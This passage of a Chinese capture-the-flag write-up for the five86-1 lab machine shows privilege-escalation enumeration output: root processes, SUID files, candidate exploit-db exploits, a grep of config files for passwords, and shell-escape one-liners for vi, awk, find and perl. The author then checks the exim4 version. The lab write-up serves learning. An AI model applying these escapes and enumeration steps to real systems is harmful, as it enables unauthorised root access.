+    alias_module (shared)
+    auth_basic_module (shared)
+    authn_core_module (shared)
+    authn_file_module (shared)
+    authz_core_module (shared)
+    authz_host_module (shared)
+    authz_user_module (shared)
+    autoindex_module (shared)
+    deflate_module (shared)
+    dir_module (shared)
+    env_module (shared)
+    filter_module (shared)
+    mime_module (shared)
+    mpm_prefork_module (shared)
+    negotiation_module (shared)
+    php7_module (shared)
+    reqtimeout_module (shared)
+    setenvif_module (shared)
+    status_module (shared)
+    Compiled in modules:
+    core.c
+    mod_so.c
+    mod_watchdog.c
+    http_core.c
+    mod_log_config.c
+    mod_logio.c
+    mod_version.c
+    mod_unixd.c
+[+] Apache Config File
+    # This is the main Apache server configuration file.  It contains the
+    # configuration directives that give the server its instructions.
+    # See http://httpd.apache.org/docs/2.4/ for detailed information about
+    # the directives and /usr/share/doc/apache2/README.Debian about Debian specific
+    # hints.
+    #
+    #
+    # Summary of how the Apache 2 configuration works in Debian:
+    # The Apache 2 web server configuration in Debian is quite different to
+    # upstream's suggested way to configure the web server. This is because Debian's
+    # default Apache2 installation attempts to make adding and removing modules,
+    # virtual hosts, and extra configuration directives as flexible as possible, in
+    # order to make automating the changes and administering the server as easy as
+    # possible.
+    # It is split into several files forming the configuration hierarchy outlined
+    # below, all located in the /etc/apache2/ directory:
+    #
+    #	/etc/apache2/
+    #	|-- apache2.conf
+    #	|	`--  ports.conf
+    #	|-- mods-enabled
+    #	|	|-- *.load
+    #	|	`-- *.conf
+    #	|-- conf-enabled
+    #	|	`-- *.conf
+    # 	`-- sites-enabled
+    #	 	`-- *.conf
+    #
+    #
+    # * apache2.conf is the main configuration file (this file). It puts the pieces
+    #   together by including all remaining configuration files when starting up the
+    #   web server.
+    #
+    # * ports.conf is always included from the main configuration file. It is
+    #   supposed to determine listening ports for incoming connections which can be
+    #   customized anytime.
+    #
+    # * Configuration files in the mods-enabled/, conf-enabled/ and sites-enabled/
+    #   directories contain particular configuration snippets which manage modules,
+    #   global configuration fragments, or virtual host configurations,
+    #   respectively.
+    #
+    #   They are activated by symlinking available configuration files from their
+    #   respective *-available/ counterparts. These should be managed by using our
+    #   helpers a2enmod/a2dismod, a2ensite/a2dissite and a2enconf/a2disconf. See
+    #   their respective man pages for detailed information.
+    #
+    # * The binary is called apache2. Due to the use of environment variables, in
+    #   the default configuration, apache2 needs to be started/stopped with
+    #   /etc/init.d/apache2 or apache2ctl. Calling /usr/bin/apache2 directly will not
+    #   work with the default configuration.
+    # Global configuration
+    #
+    #
+    # ServerRoot: The top of the directory tree under which the server's
+    # configuration, error, and log files are kept.
+    #
+    # NOTE!  If you intend to place this on an NFS (or otherwise network)
+    # mounted filesystem then please read the Mutex documentation (available
+    # at <URL:http://httpd.apache.org/docs/2.4/mod/core.html#mutex>);
+    # you will save yourself a lot of trouble.
+    #
+    # Do NOT add a slash at the end of the directory path.
+    #
+    #ServerRoot "/etc/apache2"
+    #
+    # The accept serialization lock file MUST BE STORED ON A LOCAL DISK.
+    #
+    #Mutex file:${APACHE_LOCK_DIR} default
+    #
+    # The directory where shm and other runtime files will be stored.
+    #
+    DefaultRuntimeDir ${APACHE_RUN_DIR}
+    #
+    # PidFile: The file in which the server should record its process
+    # identification number when it starts.
+    # This needs to be set in /etc/apache2/envvars
+    #
+    PidFile ${APACHE_PID_FILE}
+    #
+    # Timeout: The number of seconds before receives and sends time out.
+    #
+    Timeout 300
+    #
+    # KeepAlive: Whether or not to allow persistent connections (more than
+    # one request per connection). Set to "Off" to deactivate.
+    #
+    KeepAlive On
+    #
+    # MaxKeepAliveRequests: The maximum number of requests to allow
+    # during a persistent connection. Set to 0 to allow an unlimited amount.
+    # We recommend you leave this number high, for maximum performance.
+    #
+    MaxKeepAliveRequests 100
+    #
+    # KeepAliveTimeout: Number of seconds to wait for the next request from the
+    # same client on the same connection.
+    #
+    KeepAliveTimeout 5
+    # These need to be set in /etc/apache2/envvars
+    User ${APACHE_RUN_USER}
+    Group ${APACHE_RUN_GROUP}
+    #
+    # HostnameLookups: Log the names of clients or just their IP addresses
+    # e.g., www.apache.org (on) or 204.62.129.132 (off).
+    # The default is off because it'd be overall better for the net if people
+    # had to knowingly turn this feature on, since enabling it means that
+    # each client request will result in AT LEAST one lookup request to the
+    # nameserver.
+    #
+    HostnameLookups Off
+    # ErrorLog: The location of the error log file.
+    # If you do not specify an ErrorLog directive within a <VirtualHost>
+    # container, error messages relating to that virtual host will be
+    # logged here.  If you *do* define an error logfile for a <VirtualHost>
+    # container, that host's errors will be logged there and not here.
+    #
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    #
+    # LogLevel: Control the severity of messages logged to the error_log.
+    # Available values: trace8, ..., trace1, debug, info, notice, warn,
+    # error, crit, alert, emerg.
+    # It is also possible to configure the log level for particular modules, e.g.
+    # "LogLevel info ssl:warn"
+    #
+    LogLevel warn
+    # Include module configuration:
+    IncludeOptional mods-enabled/*.load
+    IncludeOptional mods-enabled/*.conf
+    # Include list of ports to listen on
+    Include ports.conf
+    # Sets the default security model of the Apache2 HTTPD server. It does
+    # not allow access to the root filesystem outside of /usr/share and /var/www.
+    # The former is used by web applications packaged in Debian,
+    # the latter may be used for local directories served by the web server. If
+    # your system is serving content from a sub-directory in /srv you must allow
+    # access here, or in any related virtual host.
+    <Directory />
+    Options FollowSymLinks
+    AllowOverride None
+    Require all denied
+    </Directory>
+    <Directory /usr/share>
+    AllowOverride None
+    Require all granted
+    </Directory>
+    <Directory /var/www/>
+    Options Indexes FollowSymLinks
+    AllowOverride all
+    Require all granted
+    </Directory>
+    Alias /ona "/opt/ona/www/"
+    <Directory "/opt/ona/www/">
+    Options Indexes MultiViews FollowSymLinks
+    AllowOverride All
+    Require all granted
+    </Directory>
+    <Directory /var/www/html/reports>
+    Options Indexes FollowSymLinks MultiViews
+    AllowOverride All
+    </Directory>
+    #<Directory /srv/>
+    #	Options Indexes FollowSymLinks
+    #	AllowOverride None
+    #	Require all granted
+    #</Directory>
+    # AccessFileName: The name of the file to look for in each directory
+    # for additional configuration directives.  See also the AllowOverride
+    # directive.
+    #
+    AccessFileName .htaccess
+    #
+    # The following lines prevent .htaccess and .htpasswd files from being
+    # viewed by Web clients.
+    #
+    <FilesMatch "^\.ht">
+    Require all denied
+    </FilesMatch>
+    #
+    # The following directives define some format nicknames for use with
+    # a CustomLog directive.
+    #
+    # These deviate from the Common Log Format definitions in that they use %O
+    # (the actual bytes sent including headers) instead of %b (the size of the
+    # requested file), because the latter makes it impossible to detect partial
+    # requests.
+    #
+    # Note that the use of %{X-Forwarded-For}i instead of %h is not recommended.
+    # Use mod_remoteip instead.
+    #
+    LogFormat "%v:%p %h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" vhost_combined
+    LogFormat "%h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" combined
+    LogFormat "%h %l %u %t \"%r\" %>s %O" common
+    LogFormat "%{Referer}i -> %U" referer
+    LogFormat "%{User-agent}i" agent
+    # Include of directories ignores editors' and dpkg's backup files,
+    # see README.Debian for details.
+    # Include generic snippets of statements
+    IncludeOptional conf-enabled/*.conf
+    # Include the virtual host configurations:
+    IncludeOptional sites-enabled/*.conf
+    # vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+[+] Sudo Version (Check out http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=sudo)
+    Sudo version 1.8.27
+    Sudoers policy plugin version 1.8.27
+    Sudoers file grammar version 46
+    Sudoers I/O plugin version 1.8.27
+[+] Checking for Active SSH Agents
+
+[*] IDENTIFYING PROCESSES AND PACKAGES RUNNING AS ROOT OR OTHER SUPERUSER...
+
+    root 14 20:34 0:00 [cpuhp/0]
+    root 117 20:34 0:00 [kworker/u2:2-events_unbound]
+    root 26 20:34 0:00 [kblockd]
+    root 23 20:34 0:00 [khugepaged]
+    root 25 20:34 0:00 [kintegrityd]
+    root 20 20:34 0:00 [writeback]
+    root 48 20:34 0:00 [kthrotld]
+    root 183 20:34 0:00 [jbd2/sda1-8]
+    root 95 20:34 0:00 [kworker/0:2-cgroup_destroy]
+    root 113 20:34 0:00 [scsi_eh_2]
+    root 13 20:34 0:01 [kworker/0:1-events]
+    root 115 20:34 0:00 [scsi_tmf_2]
+    root 153 20:34 0:00 [kworker/0:1H-kblockd]
+    root 19 20:34 0:00 [oom_reaper]
+    root 371 20:34 0:00 /lib/systemd/systemd-logind
+    root 181 20:34 0:00 [kworker/u3:0]
+    root 111 20:34 0:00 [scsi_tmf_0]
+    root 17 20:34 0:00 [kauditd]
+    root 184 20:34 0:00 [ext4-rsv-conver]
+    root 390 20:34 0:00 /sbin/agetty
+    root 216 20:34 0:00 /lib/systemd/systemd-journald
+    root 21 20:34 0:00 [kcompactd0]
+    root 104 20:34 0:00 [ata_sff]
+    root 6 20:34 0:00 [kworker/0:0H-kblockd]
+    root 112 20:34 0:00 [scsi_tmf_1]
+    root 400 20:34 0:00 /usr/sbin/sshd
+    root 27 20:34 0:00 [edac-poller]
+    root 3 20:34 0:00 [rcu_gp]
+    root 18 20:34 0:00 [khungtaskd]
+    root 233 20:34 0:00 /lib/systemd/systemd-udevd
+    root 8 20:34 0:00 [mm_percpu_wq]
+    root 287 20:34 0:00 [ttm_swap]
+    root 10 20:34 0:00 [rcu_sched]
+    root 9 20:34 0:00 [ksoftirqd/0]
+    root 2 20:34 0:00 [kthreadd]
+    root 4 20:34 0:00 [rcu_par_gp]
+    root 362 20:34 0:00 /sbin/dhclient
+    root 16 20:34 0:00 [netns]
+    root 369 20:34 0:00 /usr/sbin/rsyslogd
+    root 28 20:34 0:00 [devfreq_wq]
+    root 49 20:34 0:00 [ipv6_addrconf]
+    root 11 20:34 0:00 [rcu_bh]
+    root 50 20:34 0:00 [kworker/u2:1-events_unbound]
+    root 831 20:34 0:00 /usr/bin/perl
+        Possible Related Packages: 
+             libapt-pkg-perl 0.1.34+b1  Perl interface to libapt-pkg
+             libauthen-pam-perl 0.16-3+b6  Perl interface to PAM library
+             libcgi-fast-perl 1:2.13-1  CGI subclass for work with FCGI
+             libcgi-pm-perl 4.40-1  module for Common Gateway Interface applications
+             libconfig-inifiles-perl 3.000001-1  read .ini-style configuration files
+             libdbd-mysql-perl:amd64 4.050-2  Perl5 database interface to the MariaDB/MySQL database
+             libdbi-perl:amd64 1.642-1+b1  Perl Database Interface (DBI)
+             libencode-locale-perl 1.05-1  utility to determine the locale encoding
+             liberror-perl 0.17027-2  Perl module for error/exception handling in an OO-ish way
+             libfcgi-perl 0.78-2+b3  helper module for FastCGI
+             libhtml-parser-perl 3.72-3+b3  collection of modules that parse HTML text documents
+             libhtml-tagset-perl 3.20-3  Data tables pertaining to HTML
+             libhtml-template-perl 2.97-1  module for using HTML templates with Perl
+             libhttp-date-perl 6.02-1  module of date conversion routines
+             libhttp-message-perl 6.18-1  perl interface to HTTP style messages
+             libio-html-perl 1.001-1  open an HTML file with automatic charset detection
+             libio-pty-perl 1:1.08-1.1+b5  Perl module for pseudo tty IO
+             liblocale-gettext-perl 1.07-3+b4  module using libc functions for internationalization in Perl
+             liblwp-mediatypes-perl 6.02-1  module to guess media type for a file or a URL
+             libnet-ssleay-perl 1.85-2+b1  Perl module for Secure Sockets Layer (SSL)
+             libperl5.28:amd64 5.28.1-6  shared Perl library
+             libterm-readkey-perl 2.38-1  perl module for simple terminal control
+             libtext-charwidth-perl 0.04-7.1+b1  get display widths of characters on the terminal
+             libtext-iconv-perl 1.7-5+b7  converts between character sets in Perl
+             libtext-wrapi18n-perl 0.06-7.1  internationalized substitute of Text::Wrap
+             libtimedate-perl 2.3000-2  collection of modules to manipulate date/time information
+             liburi-perl 1.76-1  module to manipulate and access URI strings
+             perl 5.28.1-6  Larry Wall's Practical Extraction and Report Language
+             perl-base 5.28.1-6  minimal Perl system
+             perl-modules-5.28 5.28.1-6  Core Perl modules
+             perl-openssl-defaults:amd64 3  version compatibility baseline for Perl OpenSSL packages
+    root 29 20:34 0:00 [watchdogd]
+    root 22 20:34 0:00 [ksmd]
+    root 432 20:34 0:00 /usr/sbin/apache2
+        Possible Related Packages: 
+             apache2 2.4.38-3+deb10u3  Apache HTTP Server
+             apache2-bin 2.4.38-3+deb10u3  Apache HTTP Server (modules and other binary files)
+             apache2-data 2.4.38-3+deb10u3  Apache HTTP Server (common files)
+             apache2-utils 2.4.38-3+deb10u3  Apache HTTP Server (utility programs for web servers)
+             libapache2-mod-php 2:7.3+69  server-side, HTML-embedded scripting language (Apache 2 module) (default)
+             libapache2-mod-php7.3 7.3.11-1~deb10u1  server-side, HTML-embedded scripting language (Apache 2 module)
+    root 108 20:34 0:00 [scsi_eh_0]
+    root 109 20:34 0:00 [scsi_eh_1]
+    root 59 20:34 0:00 [kstrp]
+    root 370 20:34 0:00 /usr/sbin/cron
+        Possible Related Packages: 
+             cron 3.0pl1-134  process scheduling daemon
+    root 30 20:34 0:00 [kswapd0]
+    root 12 20:34 0:00 [migration/0]
+    root 1 20:34 0:00 /sbin/init
+        Possible Related Packages: 
+             init 1.56+nmu1  metapackage ensuring an init system is installed
+             init-system-helpers 1.56+nmu1  helper tools for all init systems
+             initramfs-tools 0.133+deb10u1  generic modular initramfs generator (automation)
+             initramfs-tools-core 0.133+deb10u1  generic modular initramfs generator (core tools)
+             libklibc:amd64 2.0.6-1  minimal libc subset for use with initramfs
+             lsb-base 10.2019051400  Linux Standard Base init script functionality
+             moria 5.7.10+20181022-3  Rogue-like game with an infinite dungeon, also known as umoria
+             ncurses-base 6.1+20181013-2+deb10u1  basic terminal type definitions
+             ncurses-term 6.1+20181013-2+deb10u1  additional terminal type definitions
+             sysvinit-utils 2.93-8  System-V-like utilities
+    root 15 20:34 0:00 [kdevtmpfs]
+    root 24 20:34 0:00 [crypto]
+[*] ENUMERATING INSTALLED LANGUAGES/TOOLS FOR SPLOIT BUILDING...
+
+[+] Installed Tools
+    /usr/bin/awk
+    /usr/bin/perl
+    /usr/bin/python
+    /usr/bin/vi
+    /usr/bin/find
+    /usr/bin/wget
+
+[+] Related Shell Escape Sequences...
+
+    vi-->	:!bash
+    vi-->	:set shell=/bin/bash:shell
+    awk-->	awk 'BEGIN {system("/bin/bash")}'
+    find-->	find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
+    perl-->	perl -e 'exec "/bin/bash";'
+[*] FINDING RELEVENT PRIVILEGE ESCALATION EXPLOITS...
+
+    Note: Exploits relying on a compile/scripting language not detected on this system are marked with a '**' but should still be tested!
+
+    The following exploits are ranked higher in probability of success because this script detected a related running process, OS, or mounted file system
+    - Debian OpenSSL Predictable PRNG Bruteforce SSH Exploit || http://www.exploit-db.com/exploits/5720 || Language=python
+    - MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/1518 || Language=c**
+    - Ubuntu/Debian Apache 1.3.33/1.3.34 (CGI TTY) Local Root Exploit || http://www.exploit-db.com/exploits/3384 || Language=c**
+
+    The following exploits are applicable to this kernel version and should be investigated as well
+    - Kernel ia32syscall Emulation Privilege Escalation || http://www.exploit-db.com/exploits/15023 || Language=c**
+    - Sendpage Local Privilege Escalation || http://www.exploit-db.com/exploits/19933 || Language=ruby**
+    - CAP_SYS_ADMIN to Root Exploit 2 (32 and 64-bit) || http://www.exploit-db.com/exploits/15944 || Language=c**
+    - CAP_SYS_ADMIN to root Exploit || http://www.exploit-db.com/exploits/15916 || Language=c**
+    - MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/1518 || Language=c**
+    - open-time Capability file_ns_capable() Privilege Escalation || http://www.exploit-db.com/exploits/25450 || Language=c**
+    - open-time Capability file_ns_capable() - Privilege Escalation Vulnerability || http://www.exploit-db.com/exploits/25307 || Language=c**
+[*] ENUMERATING FILE AND DIRECTORY PERMISSIONS/CONTENTS...
+
+[+] World Writeable Directories for User/Group 'Root'
+    drwxrwxrwt 4 root root 80 Nov 13 20:34 /run/lock
+    drwx-wx-wt 2 root root 4096 Dec 17  2018 /var/lib/php/sessions
+    drwxrwxrwt 2 root root 4096 Nov 13 20:34 /var/tmp
+    drwxrwxrwt 2 root root 40 Nov 13 20:34 /dev/mqueue
+    drwxrwxrwt 2 root root 40 Nov 13 20:34 /dev/shm
+    drwxrwxrwt 2 root root 4096 Nov 13 21:55 /tmp
+[+] World Writeable Directories for Users other than Root
+[+] World Writable Files
+    -rw-rw-rw- 1 root root 0 Nov 13 20:34 /sys/kernel/security/apparmor/.remove
+    -rw-rw-rw- 1 root root 0 Nov 13 20:34 /sys/kernel/security/apparmor/.replace
+    -rw-rw-rw- 1 root root 0 Nov 13 20:34 /sys/kernel/security/apparmor/.load
+    -rw-rw-rw- 1 root root 0 Nov 13 20:34 /sys/kernel/security/apparmor/.access
+    --w--w--w- 1 root root 0 Nov 13 21:56 /sys/fs/cgroup/memory/user.slice/cgroup.event_control
+    --w--w--w- 1 root root 0 Nov 13 21:56 /sys/fs/cgroup/memory/cgroup.event_control
+    --w--w--w- 1 root root 0 Nov 13 21:56 /sys/fs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
+    --w--w--w- 1 root root 0 Nov 13 21:56 /sys/fs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
+    --w--w--w- 1 root root 0 Nov 13 21:56 /sys/fs/cgroup/memory/system.slice/cron.service/cgroup.event_control
+    --w--w--w- 1 root root 0 Nov 13 21:56 /sys/fs/cgroup/memory/system.slice/mariadb.service/cgroup.event_control
+    --w--w--w- 1 root root 0 Nov 13 21:56 /sys/fs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
+    --w--w--w- 1 root root 0 Nov 13 21:56 /sys/fs/cgroup/memory/system.slice/webmin.service/cgroup.event_control
+    --w--w--w- 1 root root 0 Nov 13 21:56 /sys/fs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
+    --w--w--w- 1 root root 0 Nov 13 21:56 /sys/fs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
+    --w--w--w- 1 root root 0 Nov 13 21:56 /sys/fs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
+    --w--w--w- 1 root root 0 Nov 13 21:56 /sys/fs/cgroup/memory/system.slice/exim4.service/cgroup.event_control
+    --w--w--w- 1 root root 0 Nov 13 21:56 /sys/fs/cgroup/memory/system.slice/dev-disk-by\x2duuid-d4a346be\x2d600e\x2d4c8b\x2da54d\x2d3054f8c4e55c.swap/cgroup.event_control
+    --w--w--w- 1 root root 0 Nov 13 21:56 /sys/fs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
+    --w--w--w- 1 root root 0 Nov 13 21:56 /sys/fs/cgroup/memory/system.slice/cgroup.event_control
+    --w--w--w- 1 root root 0 Nov 13 21:56 /sys/fs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
+    --w--w--w- 1 root root 0 Nov 13 21:56 /sys/fs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
+    --w--w--w- 1 root root 0 Nov 13 21:56 /sys/fs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
+    --w--w--w- 1 root root 0 Nov 13 21:56 /sys/fs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
+    --w--w--w- 1 root root 0 Nov 13 21:56 /sys/fs/cgroup/memory/system.slice/system-getty.slice/getty@tty1.service/cgroup.event_control
+    --w--w--w- 1 root root 0 Nov 13 21:56 /sys/fs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
+    --w--w--w- 1 root root 0 Nov 13 21:56 /sys/fs/cgroup/memory/system.slice/ifup@eth0.service/cgroup.event_control
+    --w--w--w- 1 root root 0 Nov 13 21:56 /sys/fs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
+[+] Checking if root's home folder is accessible
+[+] SUID/SGID Files and Directories
+    drwxr-sr-x 3 root systemd-journal 60 Nov 13 20:34 /run/log/journal
+    drwxr-s---+ 2 root systemd-journal 60 Nov 13 20:34 /run/log/journal/d0e85daf37404f46b98836dc70dad1a9
+    drwxr-s--- 2 mysql adm 4096 Nov 13 06:49 /var/log/mysql
+    drwxr-s--- 2 Debian-exim adm 4096 Jan  1  2020 /var/log/exim4
+    drwxrwsr-x 2 root games 4096 Sep 10  2018 /var/games/asciijump
+    drwxrwsr-x 5 root games 4096 Jan  1  2020 /var/games/bsdgames
+    drwxrwsr-x 2 root games 4096 Jan  1  2020 /var/games/bsdgames/phantasia
+    drwxrwsr-x 3 root games 4096 Jan  1  2020 /var/games/bsdgames/hack
+    drwxrwsr-x 2 root games 4096 Apr 28  2018 /var/games/bsdgames/hack/save
+    drwxrwsr-x 2 root games 4096 Apr 28  2018 /var/games/bsdgames/sail
+    drwsrwsr-x 2 games games 4096 Apr 16  2018 /var/games/animals
+    drwxrwsr-x 2 root games 4096 Jan  1  2020 /var/games/angband/apex
+    drwxrwsr-x 2 root games 4096 Sep 17  2018 /var/games/angband/save
+    drwxrwsr-x 2 root games 4096 Jan  1  2020 /var/games/moria
+    drwxrwsr-x 4 root games 4096 Jan  1  2020 /var/games/nethack
+    drwxrwsr-x 2 root games 4096 Sep 16  2018 /var/games/nethack/dumps
+    drwxrwsr-x 2 root games 4096 Sep 16  2018 /var/games/nethack/save
+    drwxrwsr-x 2 root root 4096 Jan  1  2020 /var/games/omega-rpg
+    drwxrwsr-x 2 root mail 4096 Jan  1  2020 /var/mail
+    drwxrwsr-x 2 root staff 4096 Aug 30  2019 /var/local
+    -rwxr-sr-x 1 root mail 18944 Dec  3  2017 /usr/bin/dotlockfile
+    -rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
+    -rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
+    -rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
+    -rwxr-sr-x 1 root crontab 43568 Jun 23  2019 /usr/bin/crontab
+    -rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
+    -rwxr-sr-x 1 root root 15048 Mar 14  2019 /usr/bin/dotlock.mailutils
+    -rwxr-sr-x 1 root shadow 31000 Jul 27  2018 /usr/bin/expiry
+    -rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
+    -rwxr-sr-x 1 root shadow 71816 Jul 27  2018 /usr/bin/chage
+    -rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
+    -rwsr-xr-x 1 root root 157192 Oct 12  2019 /usr/bin/sudo
+    -rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
+    -rwxr-sr-x 1 root tty 14736 May  4  2018 /usr/bin/bsd-write
+    -rwxr-sr-x 1 root ssh 321672 Oct  6  2019 /usr/bin/ssh-agent
+    -rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
+    -rwxr-sr-x 1 root tty 34896 Jan 10  2019 /usr/bin/wall
+    -rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+    -rwsr-xr-- 1 root messagebus 51184 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+    -rwxr-sr-x 1 root games 2588752 Sep 16  2018 /usr/lib/games/nethack/nethack-console
+    -rwxr-sr-x 1 root games 14632 Sep 16  2018 /usr/lib/games/nethack/recover
+    -rwxr-sr-x 1 root games 2326096 May  6  2018 /usr/lib/games/slashem/slashem
+    -rwsr-xr-x 1 root root 436552 Oct  6  2019 /usr/lib/openssh/ssh-keysign
+    -rwsr-xr-x 1 root root 1181384 Sep 27  2019 /usr/sbin/exim4
+    -rwxr-sr-x 1 root shadow 39616 Feb 14  2019 /usr/sbin/unix_chkpwd
+    -rwxr-sr-x 1 root games 22528 Apr 28  2018 /usr/games/snake
+    -rwxr-sr-x 1 root games 209240 Apr 28  2018 /usr/games/battlestar
+    -rwxr-sr-x 1 root games 56224 Sep 10  2018 /usr/games/asciijump
+    -rwxr-sr-x 1 root games 26992 Apr 28  2018 /usr/games/tetris-bsd
+    -rwxr-sr-x 1 root games 27592 May  4  2018 /usr/games/bombardier
+    -rwxr-sr-x 1 root games 39000 Apr 28  2018 /usr/games/cribbage
+    -rwxr-sr-x 1 root games 27160 Oct 11  2018 /usr/games/greed
+    -rwxr-sr-x 1 games games 51880 Apr 16  2018 /usr/games/animals
+    -rwxr-sr-x 1 root games 208088 Nov 17  2018 /usr/games/bastet
+    -rwxr-sr-x 1 root games 30816 Apr 28  2018 /usr/games/canfield
+    -rwxr-sr-x 1 root games 2010496 Sep 17  2018 /usr/games/angband
+    -rwxr-sr-x 1 root games 87976 Sep  3  2018 /usr/games/freesweep
+    -rwxr-sr-x 1 root games 515872 Jan 29  2019 /usr/games/moria
+    -rwxr-sr-x 1 root games 96328 Apr 28  2018 /usr/games/phantasia
+    -rwxr-sr-x 1 root games 26736 Apr 28  2018 /usr/games/robots
+    -rwxr-sr-x 1 root games 290344 Apr 28  2018 /usr/games/hack
+    -rwxr-sr-x 1 root games 23072 May  5  2018 /usr/games/petris
+    -rwxr-sr-x 1 root games 89744 Apr 28  2018 /usr/games/sail
+    -rwxr-sr-x 1 root games 53216 Apr 28  2018 /usr/games/atc
+    -rwxr-sr-x 1 root games 683784 May  5  2018 /usr/games/omega-rpg
+    drwxrwsr-x 3 root staff 4096 Dec 31  2019 /usr/local/lib/python3.7
+    drwxrwsr-x 2 root staff 4096 Dec 31  2019 /usr/local/lib/python3.7/dist-packages
+    drwxrwsr-x 4 root staff 4096 Jan  1  2020 /usr/local/lib/python2.7
+    drwxrwsr-x 2 root staff 4096 Jan  1  2020 /usr/local/lib/python2.7/site-packages
+    drwxrwsr-x 2 root staff 4096 Dec 31  2019 /usr/local/lib/python2.7/dist-packages
+
+[+] Logs containing keyword 'password'
+[+] Config files containing keyword 'password'
+    /etc/debconf.conf:# World-readable, and accepts everything but passwords.
+    /etc/debconf.conf:Reject-Type: password
+    /etc/debconf.conf:# Not world readable (the default), and accepts only passwords.
+    /etc/debconf.conf:Name: passwords
+    /etc/debconf.conf:Accept-Type: password
+    /etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat
+    /etc/debconf.conf:# databases, one to hold passwords and one for everything else.
+    /etc/debconf.conf:Stack: config, passwords
+    /etc/debconf.conf:# A remote LDAP database. It is also read-only. The password is really
+    /etc/apache2/sites-available/default-ssl.conf:		#	 Note that no password is obtained from the user. Every entry in the user
+    /etc/apache2/sites-available/default-ssl.conf:		#	 file needs this password: `xxj31ZMTZzkVA'.
+    /etc/hdparm.conf:# --security-set-pass Set security password
+    /etc/hdparm.conf:# security_pass = password
+    /etc/hdparm.conf:# --user-master Select password to use
+    /etc/ssl/openssl.cnf:# input_password = secret
+    /etc/ssl/openssl.cnf:# output_password = secret
+    /etc/ssl/openssl.cnf:challengePassword		= A challenge password
+    /etc/mysql/mariadb.conf.d/50-mysqld_safe.cnf:# It has been reported that passwords should be enclosed with ticks/quotes
+    /etc/mysql/mariadb.conf.d/50-server.cnf:# Needed so the root database user can authenticate without a password but
+    /etc/mysql/my.cnf.fallback:# It has been reported that passwords should be enclosed with ticks/quotes
+    /etc/reportbug.conf:# Username and password for SMTP
+    /etc/exim4/exim4.conf.template:# Authenticators which rely on unencrypted clear text passwords don't
+    /etc/exim4/exim4.conf.template:# advertise unencrypted clear text password based authenticators on all
+    /etc/exim4/exim4.conf.template:# preferred over allowing clear text password based authenticators on
+    /etc/exim4/exim4.conf.template:# use), an authentication ID, and a password. The latter two appear as
+    /etc/exim4/exim4.conf.template:# valid username and password. In a real configuration you would typically
+    /etc/exim4/exim4.conf.template:# password are $auth1 and $auth2. Apart from that you can use the same
+    /etc/exim4/exim4.conf.template:# Authenticate against local passwords using sasl2-bin
+    /etc/exim4/exim4.conf.template:#   # don't send system passwords over unencrypted connections
+    /etc/exim4/exim4.conf.template:# They get the passwords from CONFDIR/passwd.client, whose format is
+    /etc/exim4/exim4.conf.template:# Because AUTH PLAIN and AUTH LOGIN send the password in clear, we
+    /etc/exim4/exim4.conf.template:# clear text password authentication on all connections.
+[+] Shadow File (Privileged)
+
+Finished
+=======================================================================================
+
+```
+
+SUID权限可执行文件查询
+
+```javascript
+www-data@five86-1:/tmp$ find / -perm -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/mount
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/sbin/exim4
+www-data@five86-1:/tmp$ 
+```
+
+![16](https://havocykp.github.io/assets/images/img_blog12/16.png)
+
+发现有exim4
+
+查看exim4版本
+
+```javascript
+www-data@five86-1:/tmp$ exim --version|head -1
+exim --version|head -1
+Exim version 4.92 #5 built 27-Sep-2019 16:09:35
+```
+
+![17](https://havocykp.github.io/assets/images/img_blog12/17.png)
+
+具体版本是 4.92
+
+通过查询exim历史漏洞，发现 版本为exi<=4.90存在本地提权漏洞
+
+![18](https://havocykp.github.io/assets/images/img_blog12/18.png)
+
+搜索一下有哪些文件是当前账户可以看到的
+
+```javascript
+www-data@five86-1:/tmp$ find / -type f -user www-data
+find / -type f -user www-data
+find: '/run/exim4': Permission denied
+find: '/run/sudo': Permission denied
+find: '/run/log/journal/d0e85daf37404f46b98836dc70dad1a9': Permission denied
+find: '/run/systemd/unit-root': Permission denied
+find: '/run/systemd/inaccessible': Permission denied
+find: '/var/cache/private': Permission denied
+find: '/var/cache/ldconfig': Permission denied
